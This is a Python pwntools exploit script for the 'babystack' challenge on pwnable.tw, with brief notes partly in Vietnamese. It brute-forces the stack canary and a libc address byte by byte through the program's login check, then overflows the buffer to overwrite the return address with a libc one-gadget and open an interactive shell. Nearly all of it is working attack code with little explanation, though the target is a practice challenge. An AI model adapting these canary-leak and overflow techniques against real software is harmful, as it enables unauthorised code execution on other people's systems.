#!/home/khanh/.local/share/pipx/venvs/pwntools/bin/python3
from pwn import *

# context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']

e = context.binary = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")

# HELPER
def B(x, enc='utf-8'):
    if isinstance(x, bytes):
        return x
    return str(x).encode(enc)

def connect():
    HOST, PORT = "chall.pwnable.tw", 10205
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        return remote(HOST, PORT)
    return e.process()

def GDB(p):
    script = '''
    '''
    gdb.attach(p, gdbscript=script)

# OFFSET & VARIABLES

# FUNCTIONS
def enter_password(p, password):
    p.sendlineafter(b">>", B(1))
    p.sendafter(b"Your passowrd :", B(password))

def copy(p, data):
    p.sendlineafter(b">>", B(3))
    p.sendafter(b"Copy :", B(data))


def one_byte_check(p, pos, target):
    for b in range(1, 256):
        target[pos] = b

        enter_password(p, bytes(target))

        sleep(0.2)

        message = p.recvline().decode().rstrip()

        if (message == "Login Success !"):
            print(f"[+] Found {pos}: {hex(b)}")
            return b

def brute_force(p, MAX_BYTES):
    target = bytearray([0] * MAX_BYTES)

    for pos in range(MAX_BYTES):
        print(f"[*] Brute force {pos}...")

        val = one_byte_check(p, pos, target)
        if val != None:
            target[pos] = val
    
        p.sendlineafter(b">>", B(1))
        sleep(0.3)

    return bytes(target)

# MAIN
def main():
    p = connect()

    # GDB(p)

    PASSWORD = brute_force(p, 17)                  # Stack Canary Value


    # p.sendlineafter(b">>", B(1))    # Logout

    '''

    - Initialize non null-byte to padding
    - Overwrite first 8 byte of <stack_Canary+0> make sure <stack_Canary+8> is libc value
    
    '''

    enter_password(p, b"A" * 64 + b"B" * 8)

    '''

    - Bypass Login Check

    '''
    enter_password(p, b"\0")

    '''

    - Overwrite null above make strcpy do full copy!

    '''

    copy(p, b"A")

    p.sendlineafter(b">>", B(1))    # Logout

    libc.address = u64(brute_force(p, 15)[8:14].ljust(8, b"\0")) - 0x78439

    print(f"LIBC BASE -> {hex(libc.address)}")

    payload = b"A" * 64
    payload += PASSWORD
    payload += b"A" * 23
    payload += p64(libc.address + 0x45216)

    enter_password(p, payload)
    enter_password(p, b"\0")
    copy(p, b"A")

    # GDB(p)

    p.sendlineafter(b">>", B(2))

    p.interactive()


if __name__ == '__main__':
    main()


'''

- Mục tiêu:
    + Leak libc base
    + Leak stack canary value
    -> ROP Chain -> system
    -> One gadget

&local_28 = 0x00007fffffffe0e0
stack_pointer = 0x00007ffff7ff1000
&local_88 = 0x00007fffffffe010
&local_68 = 0x7fffffffe0a0

enter_password breakpoint -> 0x555555400fc1

offet -> 0x78439

gef➤  i b
Num     Type           Disp Enb Address            What
5       breakpoint     keep y   0x0000555555400ecf 
        breakpoint already hit 1 time
6       breakpoint     keep y   0x0000555555401020 
        breakpoint already hit 2 times
7       breakpoint     keep y   0x0000555555400fc1 
        breakpoint already hit 1 time



'''
